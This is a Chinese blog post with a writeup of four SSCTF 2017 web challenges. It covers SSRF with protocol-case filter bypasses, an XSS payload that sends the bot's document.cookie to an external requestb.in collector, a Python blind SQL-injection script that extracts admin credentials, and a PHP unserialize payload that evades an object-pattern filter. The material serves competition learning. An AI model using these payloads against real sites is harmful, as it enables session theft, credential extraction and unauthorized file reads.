<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">

    

    <title>
      SSCTF 2017 writeup | HeartSky&#39;s blog 
    </title>

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    
      <meta name="author" content="HeartSky">
    
    

    <meta name="description" content="Web捡吗？ - 100ssrf 的漏洞，打开后可以看到 news.php?url=xxx，因为题目说是有一台 10.23.173.* 的服务器，所以扫下这个网段，是 10.23.173.190。刚开始的时候扫了下内网服务器的目录，得到了 l.php readme 什么的文件，做了半天后来才知道这是 web3 的服务器 ==最后主办方放了个很大的提示1过程 120.132.21.19 -&amp;gt;">
<meta name="keywords" content="CTF,writeup">
<meta property="og:type" content="article">
<meta property="og:title" content="SSCTF 2017 writeup | HeartSky&#39;s blog">
<meta property="og:url" content="http://heartsky.info/2017/05/09/SSCTF-2017-writeup/index.html">
<meta property="og:site_name" content="HeartSky&#39;s blog">
<meta property="og:description" content="Web捡吗？ - 100ssrf 的漏洞，打开后可以看到 news.php?url=xxx，因为题目说是有一台 10.23.173.* 的服务器，所以扫下这个网段，是 10.23.173.190。刚开始的时候扫了下内网服务器的目录，得到了 l.php readme 什么的文件，做了半天后来才知道这是 web3 的服务器 ==最后主办方放了个很大的提示1过程 120.132.21.19 -&amp;gt;">
<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SSCTF 2017 writeup | HeartSky&#39;s blog">
<meta name="twitter:description" content="Web捡吗？ - 100ssrf 的漏洞，打开后可以看到 news.php?url=xxx，因为题目说是有一台 10.23.173.* 的服务器，所以扫下这个网段，是 10.23.173.190。刚开始的时候扫了下内网服务器的目录，得到了 l.php readme 什么的文件，做了半天后来才知道这是 web3 的服务器 ==最后主办方放了个很大的提示1过程 120.132.21.19 -&amp;gt;">
    
    
    
      <link rel="icon" type="image/x-icon" href="/favicon.png">
    
    <link rel="stylesheet" href="/css/uno.css">
    <link rel="stylesheet" href="/css/highlight.css">
    <link rel="stylesheet" href="/css/archive.css">
    <link rel="stylesheet" href="/css/china-social-icon.css">

</head>
<body>

    <span class="mobile btn-mobile-menu">
        <i class="icon icon-list btn-mobile-menu__icon"></i>
        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

    

<header class="panel-cover panel-cover--collapsed">


  <div class="panel-main">

  
    <div class="panel-main__inner panel-inverted">
    <div class="panel-main__content">

        

        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
        <hr class="panel-cover__divider" />

        
        <p class="panel-cover__description">
          在渗透之路上渐行渐远
        </p>
        <hr class="panel-cover__divider panel-cover__divider--secondary" />
        

        <div class="navigation-wrapper">

          <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">

              
                
                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
              
                
                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
              
                
                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
              
                
                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
              

            </ul>
          </nav>

          <!-- ----------------------------
To add a new social icon simply duplicate one of the list items from below
and change the class in the <i> tag to match the desired social network
and then add your link to the <a>. Here is a full list of social network
classes that you can use:

    icon-social-500px
    icon-social-behance
    icon-social-delicious
    icon-social-designer-news
    icon-social-deviant-art
    icon-social-digg
    icon-social-dribbble
    icon-social-facebook
    icon-social-flickr
    icon-social-forrst
    icon-social-foursquare
    icon-social-github
    icon-social-google-plus
    icon-social-hi5
    icon-social-instagram
    icon-social-lastfm
    icon-social-linkedin
    icon-social-medium
    icon-social-myspace
    icon-social-path
    icon-social-pinterest
    icon-social-rdio
    icon-social-reddit
    icon-social-skype
    icon-social-spotify
    icon-social-stack-overflow
    icon-social-steam
    icon-social-stumbleupon
    icon-social-treehouse
    icon-social-tumblr
    icon-social-twitter
    icon-social-vimeo
    icon-social-xbox
    icon-social-yelp
    icon-social-youtube
    icon-social-zerply
    icon-mail

-------------------------------->

<!-- add social info here -->



        </div>

      </div>

    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>

    <div class="content-wrapper">
        <div class="content-wrapper__inner entry">
            

<article class="post-container post-container--single">

  <header class="post-header">
    
    <h1 class="post-title">SSCTF 2017 writeup</h1>

    

    <div class="post-meta">
      <time datetime="2017-05-09" class="post-meta__date date">2017-05-09</time> 

      <span class="post-meta__tags tags">

          

          
             &#8226; 标签:
            <font class="tags">
              <a class="tags-link" href="/tags/CTF/">CTF</a>, <a class="tags-link" href="/tags/writeup/">writeup</a>
            </font>
          

      </span>
    </div>
    
    

  </header>

  <section id="post-content" class="article-content post">
    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="捡吗？-100"><a href="#捡吗？-100" class="headerlink" title="捡吗？ - 100"></a>捡吗？ - 100</h3><p>ssrf 的漏洞，打开后可以看到 <code>news.php?url=xxx</code>，因为题目说是有一台 10.23.173.* 的服务器，所以扫下这个网段，是 10.23.173.190。刚开始的时候扫了下内网服务器的目录，得到了 l.php readme 什么的文件，做了半天后来才知道这是 web3 的服务器 ==<br>最后主办方放了个很大的提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过程 120.132.21.19 -&gt; 10.23.173.190 -&gt; ftp://172.17.0.2</span><br></pre></td></tr></table></figure></p>
<p>ftp 有过滤，大小写可以绕过<br>访问这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.132.21.19/news.php?url=10.23.173.190/news.php?url=Ftp://172.17.0.2/</span><br></pre></td></tr></table></figure></p>
<p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r-- 1 root root 40 May 05 12:27 flag.txt</span><br></pre></td></tr></table></figure></p>
<p>然后再访问 flag.txt 就拿到 flag 了</p>
<h3 id="弹幕-200"><a href="#弹幕-200" class="headerlink" title="弹幕 - 200"></a>弹幕 - 200</h3><p>是一个有类似b站发送弹幕功能的网站，可以看到一个滑稽的表情在一直发，看下内容是<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/images/welcome.gif"</span> <span class="attr">onload</span>=<span class="string">"c=encodeURIComponent(document.cookie);if(c.length&gt;32)&#123;a=new Image();a.src='/xssHentai/request/1/?body='+c;&#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这条信息应该是脚本定时发的。访问 xssHentai，是一个自带的 xss 平台。任意的用户名和密码都可以登录，看到有个 flag 的 cookie，内容是 <code>&quot;if uid = 1\054you will see flag&quot;</code>，页面里有 <code>请按照/xssHentai/request/23/?body=xxxxx格式发送请求,每次刷新显示1条并删除</code>，也就是说我们登录的这个 xss 平台 flag 是 23，而 bot 登录的平台 uid 是 1，它的 cookie 里是有 flag 的。访问下 <code>body=&lt;img src=1&gt;</code>，发现是没有过滤的，图片直接解析了，那么就有一种思路了。我们在弹幕里发送 body=payload，这样 payload 就会被 bot 访问，指向我们自己的 xss 平台就可以了<br>最终的 payload<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/images/welcome.gif"</span> <span class="attr">onload</span>=<span class="string">"a=new Image();a.src='/xssHentai/request/1/?body=%3Cimg%20src%3D0%20onerror%3D%27b%3Dnew%20Image%28%29%3Bb.src%3D%22http%3A%2f%2frequestb.in%2fqdbhulqd%3Finspect%3D%22%2bdocument.cookie%27%3E';"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="白吗-全是套路-300"><a href="#白吗-全是套路-300" class="headerlink" title="白吗?全是套路-300"></a>白吗?全是套路-300</h3><p>打开后有个 news.php，get 请求里有个 id 参数，以为是注入，但是尝试了下，发现很迷<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;</span><br><span class="line">返回 select * from sscrf where id=1&apos;</span><br><span class="line">id=1 and 1=2</span><br><span class="line">返回空</span><br><span class="line">id=1 and 1=3</span><br><span class="line">返回新闻不存在</span><br></pre></td></tr></table></figure></p>
<p>神奇的代码，然后想到 web1 连接到的内网服务器是 web3 的，既然能用 ftp 协议读取文件，应该也能用 file 协议读取这台服务器的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.132.21.19/news.php?url=10.23.173.190/news.php?url=FILe:///var/www/news.php</span><br></pre></td></tr></table></figure></p>
<p>成功读到源码<br>submit.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">"CONTENT-TYPE:text/html;charset=UTF-8"</span>);</span><br><span class="line">define(<span class="string">"HOST"</span>,<span class="string">"127.0.0.1"</span>);</span><br><span class="line">define(<span class="string">"USERNAME"</span>,<span class="string">"root"</span>);</span><br><span class="line">define(<span class="string">"PASSWORD"</span>,<span class="string">""</span>);</span><br><span class="line">$con=<span class="keyword">new</span> mysqli(HOST,USERNAME,PASSWORD,<span class="string">"ctf1"</span>);</span><br><span class="line"><span class="keyword">if</span>(!$con)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $con-&gt;error;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"aaaa"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$con-&gt;select_db(<span class="string">"ctf1"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $con-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$con-&gt;query(<span class="string">"SET NAMES utf8"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $con-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$xss=$_POST[<span class="string">"sub"</span>];</span><br><span class="line">$str = addslashes($xss);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**********获取IP************/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_outer</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        $url = <span class="string">'http://www.ip138.com/ip2city.asp'</span>;  </span><br><span class="line">        $info = file_get_contents($url);  </span><br><span class="line">        preg_match(<span class="string">'|&lt;center&gt;(.*?)&lt;/center&gt;|i'</span>, $info, $m);  </span><br><span class="line">        <span class="keyword">return</span> $m[<span class="number">1</span>];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_inter</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        $onlineip = <span class="string">''</span>;  </span><br><span class="line">        <span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_CLIENT_IP'</span>), <span class="string">'unknown'</span>)) &#123;  </span><br><span class="line">            $onlineip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);  </span><br><span class="line">        &#125; <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>), <span class="string">'unknown'</span>)) &#123;  </span><br><span class="line">            $onlineip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);  </span><br><span class="line">        &#125; <span class="keyword">elseif</span> (getenv(<span class="string">'REMOTE_ADDR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'REMOTE_ADDR'</span>), <span class="string">'unknown'</span>)) &#123;  </span><br><span class="line">            $onlineip = getenv(<span class="string">'REMOTE_ADDR'</span>);  </span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">'unknown'</span>)) &#123;  </span><br><span class="line">            $onlineip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> $onlineip;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$p = <span class="keyword">new</span> Action();</span><br><span class="line">$intip = $p-&gt;get_inter();</span><br><span class="line">$outip2= $intip;</span><br><span class="line">@mkdir(<span class="string">"/tmp/ids"</span>,<span class="number">0777</span>,<span class="keyword">true</span>);</span><br><span class="line">$sql=<span class="string">"insert into ctf1(xss,ip,time,wai_ip) values('$str','$intip',NOW(),'$outip2')"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($str=$con-&gt;query($sql))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('success');window.location.href='index.php'&lt;/script&gt;"</span>;</span><br><span class="line">    $insertid = mysqli_insert_id($con);</span><br><span class="line">    file_put_contents(<span class="string">"/tmp/ids/"</span>.$insertid,<span class="string">"a"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('fail');&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后根据扫描得到的 readme 的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">修改根目录l.php</span><br><span class="line">	1.修改相关Web容器信息</span><br><span class="line">	2.修改物理路径为linux路径</span><br><span class="line">	3.删除windows关键字</span><br><span class="line">部署完成后删除根目录sql.sql、flag、pass文件</span><br><span class="line">默认数据库密码为空，数据库名为ctf1</span><br><span class="line"></span><br><span class="line">需要写的脚本</span><br><span class="line">	1.数据库中每增加一条ID，访问一次</span><br></pre></td></tr></table></figure></p>
<p>猜测是有 xss 的，可以看到插入数据库的 xss 字段是用户 POST 传进来的 sub 参数，只进行了转义。那么随便写入一个 <code>&lt;img src=your_xss_platform&gt;</code>，之后就在 xss 平台中收到了 referer 值 <code>admin/b9557ee76eeb61cadda090855a47d266-1.php?id=77930</code>，ssrf 打下这个，是自动访问数据库新增信息的脚本，里面有个 js.php，访问下就拿到了 flag</p>
<h3 id="CloverSecLogos-500"><a href="#CloverSecLogos-500" class="headerlink" title="CloverSecLogos - 500"></a>CloverSecLogos - 500</h3><p>存在 index.php 和 picture.php<br>其中 picture.php 存在 id=1 的 get 请求，应该是存在注入的，FUZZ 下可以得出 and or 空格 # 都被替换成了空，因为提示给了表名 user，字段名 username 和 password，所以写个脚本盲注就好了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">HTTP GET</span></span><br><span class="line"><span class="string">盲注</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">li = string.digits + string.ascii_letters</span><br><span class="line">url = <span class="string">'http://60.191.205.80/picture.php?id='</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabase</span><span class="params">()</span>:</span></span><br><span class="line">    database = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> li:</span><br><span class="line">            payload = <span class="string">'1"%26%26substring(DATABASE(),'</span> + str(i+<span class="number">1</span>) + <span class="string">',1)="'</span> + c</span><br><span class="line">            <span class="keyword">if</span>(getData(payload)):</span><br><span class="line">                database += c</span><br><span class="line">                <span class="keyword">print</span> database</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] The current database is '</span> + database</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUsername</span><span class="params">()</span>:</span>  </span><br><span class="line">    username = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> li:</span><br><span class="line">            payload = <span class="string">'1"%26%26(select(substring(username,'</span> + str(i+<span class="number">1</span>) + <span class="string">',1))from(user)where(id=1))="'</span> + c</span><br><span class="line">            <span class="keyword">if</span>(getData(payload)):</span><br><span class="line">                username += c</span><br><span class="line">                <span class="keyword">print</span> username</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] The current username is '</span> + username</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPassword</span><span class="params">()</span>:</span></span><br><span class="line">    password = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> li:</span><br><span class="line">            payload = <span class="string">'1"%26%26(select(substring(passwoorrd,'</span> + str(i+<span class="number">1</span>) + <span class="string">',1))from(user)where(id=1))="'</span> + str(c)</span><br><span class="line">            <span class="keyword">if</span>(getData(payload)):</span><br><span class="line">                password += c</span><br><span class="line">                <span class="keyword">print</span> password</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] The current password is '</span> + password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(payload)</span>:</span></span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Picture  not found!'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># getDatabase()</span></span><br><span class="line">    getUsername()</span><br><span class="line">    getPassword()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<p>得到用户名 admin，密码 14aceb3fc5992cef3d97，这个有20位，是 dedecms 的加密方式，去掉前三后一后解 md5 得到 admin^g<br>然后可以登录了，根据提示有备份文件，拿到源码<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>($Username==<span class="string">"Anonymous"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'xxx'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'xxx'</span>;</span><br><span class="line">    $sql=<span class="string">'select * from user where `username`="'</span>.$Username.<span class="string">'"'</span>;</span><br><span class="line">    $result=mysql_query($sql);</span><br><span class="line">    $imformation=mysql_fetch_array($result);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>])&amp;&amp;$_GET[<span class="string">'action'</span>]==<span class="string">'imformation'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'token'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $secret=$_GET[<span class="string">'secret'</span>];</span><br><span class="line">            $token =$_COOKIE[<span class="string">'token'</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($secret)&amp;&amp;(file_get_contents($secret,<span class="string">'r'</span>)===<span class="string">"1234"</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"hello Hacker!&lt;br&gt;"</span>; </span><br><span class="line">                <span class="keyword">include</span>(<span class="string">"include.php"</span>);</span><br><span class="line">                <span class="keyword">echo</span> ssctf_unserialize($token); </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"You are not Hacker ! "</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            setcookie(<span class="string">"token"</span>,<span class="string">''</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;h2 style="text-align:center;"&gt;Welcome&lt;/h2&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;div&gt;&lt;h4&gt;User imformation&lt;/h4&gt;&lt;ul&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;li&gt;Username : '</span>.$imformation[<span class="string">'username'</span>].<span class="string">'&lt;/li&gt;'</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $html=<span class="string">'&lt;h1&gt;Welcome CloverSec Labs&lt;/h1&gt;'</span>;</span><br><span class="line">        $html=$html.<span class="string">'&lt;p&gt; Hacking it! &lt;/p&gt;'</span>;</span><br><span class="line">        $html=$html.<span class="string">'&lt;a class="btn btn-primary btn-large" href="#SleepZZZzzz"&gt;SleepzzzZZZ&lt;/a&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> $html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>include.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//ssctf_flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">"ssctf_flag.php"</span>===<span class="keyword">$this</span>-&gt;file)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">exit</span>();  </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            &#125;</span><br><span class="line">               </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"you are big Hacker"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ssctf_unserialize</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $value,$matches);</span><br><span class="line">        <span class="keyword">if</span>(count($matches))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> unserialize($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到登录后就很简单了，通过反序列化读取 flag 文件，过滤了 <code>[oc]:\d+:</code> ，但是 o:+4 这样也是可以的。文件名的过滤可以用 ./，或者用 php 伪协议，最终的 payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://60.191.205.80?action=imformation&amp;secret=php://input</span><br><span class="line"></span><br><span class="line">1234</span><br><span class="line"></span><br><span class="line">token O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:16:&quot;./ssctf_flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
